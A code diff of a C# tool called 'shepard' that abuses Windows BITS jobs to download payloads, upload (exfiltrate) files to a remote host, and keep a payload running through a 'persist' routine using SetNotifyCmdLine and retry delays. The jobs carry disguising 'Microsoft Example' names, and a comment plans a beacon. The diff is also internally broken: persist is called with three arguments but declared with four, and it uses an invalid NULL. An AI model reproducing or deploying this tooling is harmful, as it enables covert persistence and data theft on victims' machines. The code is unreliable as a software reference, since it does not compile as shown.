@@ -2,6 +2,8 @@
 using System.Net;
 using BITS = BITSReference1_5;
 
+
+//add a beacon function somewhere in main ^
 namespace shepard
 {
     class JobObj
@@ -27,12 +29,12 @@ namespace shepard
                 //ex shepard -d remoteLoc writeLoc
                 if (args[0] == "-d")
                 {
-                    jo.downloadFile(args[1], args[2]);
+                    jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
                 }
                 //ex shepard -e remoteLoc writeLoc
                 else if (args[0] == "-e")
                 {
-                    jo.exfiltrateFile(args[1], args[2]);
+                    jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
                 }
             }
             else if (args.Length == 4)
@@ -40,18 +42,30 @@ namespace shepard
                 //ex shepard -dr remoteLoc writeLoc "argument argument argument" 
                 if (args[0] == "-dr")
                 {
-                    jo.downloadFile(args[1], args[2]);
-                    jo.runFile(args[2], args[3]);
+                    string temp = args[3];
+                    if (args[3] == "")
+                    {
+                        temp = "";
+                    }
+                    jo.stager(args[1], args[2], temp);
                 }
             }
             else { return; }
 
         }
 
-        //Usage params: url or ip:port, full path
-        private void downloadFile(string remoteLoc, string writeLoc)
+        private void stager(string remoteLoc, string writeLoc, string optArgs)
         {
-            mgr.CreateJob("QD", BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
+            string name = "Microsoft Example BD_1";
+            downloadFile(name, remoteLoc, writeLoc); //initial download, completes
+
+            persist(name, writeLoc, optArgs);
+        }
+
+        //Usage params: url or ip:port, full path
+        private void downloadFile(string name, string remoteLoc, string writeLoc)
+        {
+            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
             //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
             //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
             job.AddFile(remoteLoc, writeLoc);
@@ -60,15 +74,14 @@ namespace shepard
         }
 
         //Usage params: url or ip:port, full path
-        private void exfiltrateFile(string remoteLoc, string writeLoc)
+        private void exfiltrateFile(string name, string remoteLoc, string writeLoc)
         {
-            mgr.CreateJob("QU", BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
+            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
             job.AddFile(remoteLoc, writeLoc);
             jo.executeBITSJob();
         }
-        //somewhere in main, consisent loop for input of command
-        //add a beacon function somewhere in main ^
 
+        //Default execution of a BITS Job, fully completes
         private void executeBITSJob()
         {
             job.Resume();
@@ -95,18 +108,15 @@ namespace shepard
             }
         }
 
-        //Usage: path, "args"
-        private void runFile(string filePath, string cmdArgs)
+        //Usage: BITS job name, file path, "file args"
+        private void persist(string name, string remote, string filePath, string cmdArgs)
         {
-            System.Diagnostics.Process process = new System.Diagnostics.Process();
-            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-
-            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfo.FileName = filePath;
-            startInfo.Arguments = cmdArgs;
-            process.StartInfo = startInfo;
-
-            process.Start();
+            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
+            job.AddFile(remote, filePath);
+            job.SetNotifyCmdLine(filePath, NULL);
+            job.SetMinimumRetryDelay(60);
+            
+            job.Resume();
         }
     }
 }
